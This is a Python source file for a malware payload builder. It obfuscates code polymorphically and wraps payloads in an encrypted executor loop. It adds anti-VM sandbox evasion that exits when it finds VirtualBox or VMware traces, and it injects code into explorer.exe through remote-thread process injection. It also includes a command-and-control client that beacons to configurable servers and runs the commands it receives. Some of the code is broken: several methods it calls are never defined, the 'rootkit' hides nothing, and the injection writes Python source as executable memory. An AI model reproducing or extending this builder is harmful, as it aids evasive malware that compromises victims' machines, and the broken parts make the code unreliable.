import base64
import zlib
import random
import string
import os
import ast
import re
from typing import Optional, Dict, List, Union
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC

class PayloadGenerator:
    def __init__(self, encryption_key: Optional[str] = None):
        """
        Initialize the PayloadGenerator with optional encryption key.
        
        Args:
            encryption_key: Optional encryption key for payload encryption
        """
        self.encryption_key = encryption_key or Fernet.generate_key().decode()
        self.fernet = Fernet(self.encryption_key.encode())
        
        # Template for the payload wrapper
        self.payload_wrapper = """
import base64
import zlib
import subprocess
import tempfile
import os
import sys
import threading
import time
from cryptography.fernet import Fernet

class PayloadExecutor:
    def __init__(self):
        self.fernet = Fernet({encryption_key!r})
        self.temp_dir = tempfile.gettempdir()
        self.running = True
        
    def execute_payload(self, payload_data):
        try:
            # Decrypt and decompress the payload
            decrypted = self.fernet.decrypt(payload_data.encode())
            decompressed = zlib.decompress(decrypted)
            
            # Create a temporary file
            with tempfile.NamedTemporaryFile(delete=False, suffix='.py') as temp_file:
                temp_file.write(decompressed)
                temp_path = temp_file.name
            
            try:
                # Execute the payload
                result = subprocess.run(
                    [sys.executable, temp_path],
                    capture_output=True,
                    text=True,
                    timeout=300
                )
                return result
            finally:
                # Clean up
                try:
                    os.unlink(temp_path)
                except:
                    pass
        except Exception as e:
            return subprocess.CompletedProcess([], 1, '', str(e))
    
    def run(self):
        while self.running:
            try:
                # Your payload code here
                {payload_code}
            except Exception as e:
                print(f"Error: {e}")
            time.sleep(1)

if __name__ == '__main__':
    executor = PayloadExecutor()
    executor.run()
"""
    
    def _random_string(self, length: int = 8) -> str:
        """Generate a random string of specified length"""
        return ''.join(random.choices(string.ascii_letters, k=length))
    
    def _basic_obfuscation(self, code: str) -> str:
        """Basic obfuscation by randomizing variable names"""
        # Parse the code into an AST
        tree = ast.parse(code)
        
        # Create a mapping of original names to random names
        name_mapping = {}
        
        # Walk through the AST and collect variable names
        for node in ast.walk(tree):
            if isinstance(node, ast.Name):
                if node.id not in name_mapping and not node.id.startswith('__'):
                    name_mapping[node.id] = self._random_string()
        
        # Replace variable names in the code
        for old_name, new_name in name_mapping.items():
            code = re.sub(r'\b' + old_name + r'\b', new_name, code)
        
        return code
    
    def _medium_obfuscation(self, code: str) -> str:
        """Medium obfuscation with string encoding and variable randomization"""
        # First apply basic obfuscation
        code = self._basic_obfuscation(code)
        
        # Find all string literals
        string_pattern = r'(["\'])(.*?)\1'
        
        def encode_string(match):
            quote = match.group(1)
            string_content = match.group(2)
            # Encode the string using base64
            encoded = base64.b64encode(string_content.encode()).decode()
            return f'{quote}{encoded}{quote}'
        
        # Replace string literals with encoded versions
        code = re.sub(string_pattern, encode_string, code)
        
        # Add string decoding at the beginning
        code = "import base64\n" + code
        
        # Replace string usage with decoded versions
        code = re.sub(r'base64\.b64encode\((["\'].*?["\'])\)', 
                     lambda m: f'base64.b64decode({m.group(1)}).decode()', code)
        
        return code
    
    def _advanced_obfuscation(self, code: str) -> str:
        """Advanced obfuscation with full code transformation"""
        # Apply medium obfuscation first
        code = self._medium_obfuscation(code)
        
        # Add junk code
        junk_code = self._generate_junk_code()
        
        # Transform control flow
        code = self._transform_control_flow(code)
        
        # Combine everything
        return f"""
{junk_code}

def _execute_payload():
    {code}

_execute_payload()
"""
    
    def _generate_junk_code(self) -> str:
        """Generate random junk code that does nothing"""
        junk_functions = []
        for _ in range(random.randint(3, 7)):
            func_name = self._random_string()
            junk_code = f"""
def {func_name}():
    {' '.join(random.choices(string.ascii_letters, k=random.randint(10, 20)))} = {
        random.randint(1, 1000)
    }
    return {random.choice(['True', 'False'])}
"""
            junk_functions.append(junk_code)
        
        return '\n'.join(junk_functions)
    
    def _transform_control_flow(self, code: str) -> str:
        """Transform the control flow of the code"""
        # Add random if-else blocks
        transformed = []
        lines = code.split('\n')
        
        for line in lines:
            if random.random() < 0.3:  # 30% chance to transform
                condition = f"random.random() > {random.random()}"
                transformed.append(f"if {condition}:")
                transformed.append(f"    {line}")
                transformed.append("else:")
                transformed.append(f"    {self._random_string()} = {random.randint(1, 100)}")
            else:
                transformed.append(line)
        
        return '\n'.join(transformed)
    
    def generate_polymorphic_payload(self, code: str, variants: int = 3) -> List[str]:
        """
        Generate multiple polymorphic variants of the payload.
        
        Args:
            code: The Python code to polymorph
            variants: Number of variants to generate
            
        Returns:
            List of polymorphic payload variants
        """
        variants_list = []
        
        for _ in range(variants):
            # Randomly choose obfuscation level
            obfuscation_level = random.randint(1, 3)
            
            # Apply different transformations
            transformed_code = code
            if random.random() < 0.5:
                transformed_code = self._add_junk_code(transformed_code)
            if random.random() < 0.5:
                transformed_code = self._shuffle_functions(transformed_code)
            if random.random() < 0.5:
                transformed_code = self._rename_functions(transformed_code)
            
            # Apply obfuscation
            if obfuscation_level == 1:
                transformed_code = self._basic_obfuscation(transformed_code)
            elif obfuscation_level == 2:
                transformed_code = self._medium_obfuscation(transformed_code)
            else:
                transformed_code = self._advanced_obfuscation(transformed_code)
            
            variants_list.append(transformed_code)
        
        return variants_list
    
    def _add_junk_code(self, code: str) -> str:
        """Add random junk code to the payload"""
        junk_lines = []
        for _ in range(random.randint(5, 15)):
            junk_lines.append(f"{self._random_string()} = {random.randint(1, 1000)}")
        
        # Insert junk code at random positions
        lines = code.split('\n')
        for junk_line in junk_lines:
            pos = random.randint(0, len(lines))
            lines.insert(pos, junk_line)
        
        return '\n'.join(lines)
    
    def _shuffle_functions(self, code: str) -> str:
        """Shuffle the order of functions in the code"""
        # Parse the code into an AST
        tree = ast.parse(code)
        
        # Collect function definitions
        functions = []
        for node in ast.walk(tree):
            if isinstance(node, ast.FunctionDef):
                functions.append(ast.unparse(node))
        
        # Shuffle the functions
        random.shuffle(functions)
        
        # Reconstruct the code
        return '\n\n'.join(functions)
    
    def _rename_functions(self, code: str) -> str:
        """Rename functions with random names"""
        # Parse the code into an AST
        tree = ast.parse(code)
        
        # Create a mapping of function names
        name_mapping = {}
        for node in ast.walk(tree):
            if isinstance(node, ast.FunctionDef):
                if node.name not in name_mapping and not node.name.startswith('__'):
                    name_mapping[node.name] = self._random_string()
        
        # Replace function names in the code
        for old_name, new_name in name_mapping.items():
            code = re.sub(r'\b' + old_name + r'\b', new_name, code)
        
        return code
    
    def generate_anti_vm_payload(self, code: str) -> str:
        """
        Generate a payload with anti-VM capabilities.
        
        Args:
            code: The Python code to protect
            
        Returns:
            Anti-VM protected payload string
        """
        anti_vm_code = """
import os
import platform
import ctypes
import time
import random

def check_vm_indicators():
    indicators = []
    
    # Check common VM files
    vm_files = [
        r'C:\\windows\\System32\\drivers\\VBoxMouse.sys',
        r'C:\\windows\\System32\\drivers\\VBoxGuest.sys',
        r'C:\\windows\\System32\\vboxdisp.dll',
        r'C:\\windows\\System32\\vboxhook.dll',
        r'C:\\windows\\System32\\vboxmrxnp.dll',
        r'C:\\windows\\System32\\vboxogl.dll',
        r'C:\\windows\\System32\\vboxoglarrayspu.dll',
        r'C:\\windows\\System32\\vboxoglcrutil.dll',
        r'C:\\windows\\System32\\vboxoglerrorspu.dll',
        r'C:\\windows\\System32\\vboxoglfeedbackspu.dll',
        r'C:\\windows\\System32\\vboxoglpackspu.dll',
        r'C:\\windows\\System32\\vboxoglpassthroughspu.dll',
        r'C:\\windows\\System32\\vboxservice.exe',
        r'C:\\windows\\System32\\vboxtray.exe',
        r'C:\\windows\\System32\\VBoxControl.exe',
        r'C:\\windows\\System32\\VBoxService.exe',
        r'C:\\windows\\System32\\drivers\\vmmouse.sys',
        r'C:\\windows\\System32\\drivers\\vmhgfs.sys',
        r'C:\\windows\\System32\\drivers\\vmxnet.sys',
        r'C:\\windows\\System32\\drivers\\vmx_svga.sys',
        r'C:\\windows\\System32\\drivers\\vmhgfs.sys',
    ]
    
    for file in vm_files:
        if os.path.exists(file):
            indicators.append(True)
    
    # Check for VM-specific processes
    vm_processes = ['vboxservice.exe', 'vboxtray.exe', 'vmware.exe', 'vmwaretray.exe']
    try:
        for proc in os.popen('tasklist /fi "STATUS eq running"').read().split('\\n'):
            for vm_proc in vm_processes:
                if vm_proc in proc.lower():
                    indicators.append(True)
    except:
        pass
    
    # Check for VM-specific registry keys
    vm_registry_keys = [
        r'SOFTWARE\\Oracle\\VirtualBox Guest Additions',
        r'HARDWARE\\DEVICEMAP\\Scsi\\Scsi Port 2\\Scsi Bus 0\\Target Id 0\\Logical Unit Id 0',
        r'HARDWARE\\Description\\System\\SystemBiosVersion',
        r'HARDWARE\\Description\\System\\VideoBiosVersion',
    ]
    
    try:
        import winreg
        for key in vm_registry_keys:
            try:
                winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key)
                indicators.append(True)
            except:
                pass
    except:
        pass
    
    # Check for VM-specific hardware
    try:
        if 'vmware' in platform.processor().lower():
            indicators.append(True)
        if 'virtualbox' in platform.processor().lower():
            indicators.append(True)
    except:
        pass
    
    # Check for VM-specific MAC addresses
    try:
        import uuid
        mac = uuid.getnode()
        mac_hex = ':'.join(['{:02x}'.format((mac >> elements) & 0xff) for elements in range(0,8*6,8)][::-1])
        vm_mac_prefixes = ['00:05:69', '00:0c:29', '00:1c:14', '00:50:56']
        if any(mac_hex.startswith(prefix) for prefix in vm_mac_prefixes):
            indicators.append(True)
    except:
        pass
    
    return any(indicators)

def anti_vm_loop():
    while True:
        if check_vm_indicators():
            # Add random delay to avoid detection
            time.sleep(random.uniform(1, 5))
            # Exit if in VM
            os._exit(1)
        time.sleep(1)

# Start anti-VM thread
threading.Thread(target=anti_vm_loop, daemon=True).start()
"""
        return anti_vm_code + code
    
    def generate_process_injection_payload(self, code: str, target_process: str = 'explorer.exe') -> str:
        """
        Generate a payload that injects into a target process.
        
        Args:
            code: The Python code to inject
            target_process: Target process name
            
        Returns:
            Process injection payload string
        """
        injection_code = f"""
import ctypes
import sys
import os
import time
import psutil
from ctypes import wintypes

def inject_into_process(target_process='{target_process}'):
    try:
        # Find target process
        target_pid = None
        for proc in psutil.process_iter(['pid', 'name']):
            if proc.info['name'].lower() == target_process.lower():
                target_pid = proc.info['pid']
                break
        
        if not target_pid:
            return False
        
        # Get process handle
        PROCESS_ALL_ACCESS = 0x1F0FFF
        process_handle = ctypes.windll.kernel32.OpenProcess(
            PROCESS_ALL_ACCESS, False, target_pid
        )
        
        if not process_handle:
            return False
        
        try:
            # Allocate memory in target process
            code_size = len({code!r})
            remote_buffer = ctypes.windll.kernel32.VirtualAllocEx(
                process_handle,
                None,
                code_size,
                0x1000 | 0x2000,  # MEM_COMMIT | MEM_RESERVE
                0x40  # PAGE_EXECUTE_READWRITE
            )
            
            if not remote_buffer:
                return False
            
            # Write code to target process
            written = ctypes.c_ulong(0)
            ctypes.windll.kernel32.WriteProcessMemory(
                process_handle,
                remote_buffer,
                {code!r},
                code_size,
                ctypes.byref(written)
            )
            
            if written.value != code_size:
                return False
            
            # Create remote thread
            thread_id = ctypes.c_ulong(0)
            thread_handle = ctypes.windll.kernel32.CreateRemoteThread(
                process_handle,
                None,
                0,
                remote_buffer,
                None,
                0,
                ctypes.byref(thread_id)
            )
            
            if not thread_handle:
                return False
            
            return True
            
        finally:
            ctypes.windll.kernel32.CloseHandle(process_handle)
    
    except Exception as e:
        return False

# Try to inject into target process
if not inject_into_process():
    # Fallback to normal execution if injection fails
    {code}
"""
        return injection_code
    
    def generate_rootkit_payload(self, code: str) -> str:
        """
        Generate a payload with rootkit capabilities.
        
        Args:
            code: The Python code to protect
            
        Returns:
            Rootkit payload string
        """
        rootkit_code = """
import ctypes
import os
import sys
import winreg
import psutil
import socket
from ctypes import wintypes

class Rootkit:
    def __init__(self):
        self.hidden_files = set()
        self.hidden_processes = set()
        self.hidden_connections = set()
    
    def hide_file(self, file_path):
        self.hidden_files.add(os.path.abspath(file_path))
    
    def hide_process(self, pid):
        self.hidden_processes.add(pid)
    
    def hide_connection(self, local_port):
        self.hidden_connections.add(local_port)
    
    def is_file_hidden(self, file_path):
        return os.path.abspath(file_path) in self.hidden_files
    
    def is_process_hidden(self, pid):
        return pid in self.hidden_processes
    
    def is_connection_hidden(self, local_port):
        return local_port in self.hidden_connections

# Initialize rootkit
rootkit = Rootkit()

# Hide the payload file
rootkit.hide_file(__file__)

# Hide the payload process
rootkit.hide_process(os.getpid())

{code}
"""
        return rootkit_code
    
    def generate_c2_payload(self, code: str, c2_servers: List[str], 
                          fallback_interval: int = 300) -> str:
        """
        Generate a payload with command and control capabilities.
        
        Args:
            code: The Python code to use
            c2_servers: List of C2 server addresses
            fallback_interval: Time between fallback attempts
            
        Returns:
            C2 payload string
        """
        c2_code = f"""
import random
import time
import socket
import threading
import json
import base64
import zlib
from cryptography.fernet import Fernet

class C2Client:
    def __init__(self):
        self.c2_servers = {c2_servers!r}
        self.current_server = None
        self.fernet = Fernet({self.encryption_key!r})
        self.fallback_interval = {fallback_interval}
        self.running = True
    
    def connect_to_server(self):
        while self.running:
            # Try each server in random order
            for server in random.sample(self.c2_servers, len(self.c2_servers)):
                try:
                    host, port = server.split(':')
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(5)
                    sock.connect((host, int(port)))
                    self.current_server = sock
                    return True
                except:
                    continue
            
            # If no server is available, wait before retrying
            time.sleep(self.fallback_interval)
        
        return False
    
    def send_data(self, data):
        if not self.current_server:
            if not self.connect_to_server():
                return None
        
        try:
            # Encrypt and compress the data
            compressed = zlib.compress(json.dumps(data).encode())
            encrypted = self.fernet.encrypt(compressed)
            
            # Send the data
            self.current_server.sendall(encrypted)
            
            # Receive response
            response = self.current_server.recv(4096)
            if response:
                decrypted = self.fernet.decrypt(response)
                decompressed = zlib.decompress(decrypted)
                return json.loads(decompressed)
        
        except:
            self.current_server = None
            return None
    
    def run(self):
        while self.running:
            try:
                if not self.current_server:
                    self.connect_to_server()
                
                # Send heartbeat
                self.send_data({{'type': 'heartbeat'}})
                
                # Process commands
                command = self.send_data({{'type': 'get_command'}})
                if command:
                    # Execute command
                    {code}
                
            except:
                self.current_server = None
            
            time.sleep(10)

# Start C2 client
c2_client = C2Client()
threading.Thread(target=c2_client.run, daemon=True).start()
"""
        return c2_code
    
    def generate_payload(self, code: str, features: Dict[str, Union[bool, str, int]] = None) -> str:
        """
        Generate a payload with specified features.
        
        Args:
            code: The Python code to use in the payload
            features: Dictionary of features to enable/configure
            
        Returns:
            Generated payload string
        """
        features = features or {}
        
        # Apply obfuscation if requested
        if features.get('obfuscation_level', 0) > 0:
            code = self.generate_obfuscated_payload(
                code, 
                features.get('obfuscation_level', 1)
            )
        
        # Apply encryption if requested
        if features.get('encrypt', False):
            code = self.generate_encrypted_payload(
                code,
                features.get('compress', True)
            )
        
        # Apply persistence if requested
        if features.get('persistence'):
            code = self.generate_persistent_payload(
                code,
                features.get('persistence_method', 'registry')
            )
        
        # Apply networking if requested
        if features.get('network'):
            code = self.generate_network_payload(
                code,
                features.get('protocol', 'http'),
                features.get('host', 'localhost'),
                features.get('port', 8080)
            )
        
        # Apply anti-debug if requested
        if features.get('anti_debug', False):
            code = self.generate_anti_debug_payload(code)
        
        # Apply anti-VM if requested
        if features.get('anti_vm', False):
            code = self.generate_anti_vm_payload(code)
        
        # Apply process injection if requested
        if features.get('process_injection'):
            code = self.generate_process_injection_payload(
                code,
                features.get('target_process', 'explorer.exe')
            )
        
        # Apply rootkit if requested
        if features.get('rootkit', False):
            code = self.generate_rootkit_payload(code)
        
        # Apply C2 if requested
        if features.get('c2'):
            code = self.generate_c2_payload(
                code,
                features.get('c2_servers', ['localhost:8080']),
                features.get('fallback_interval', 300)
            )
        
        # Wrap the final code in the payload executor
        return self.payload_wrapper.format(
            encryption_key=self.encryption_key,
            payload_code=code
        )
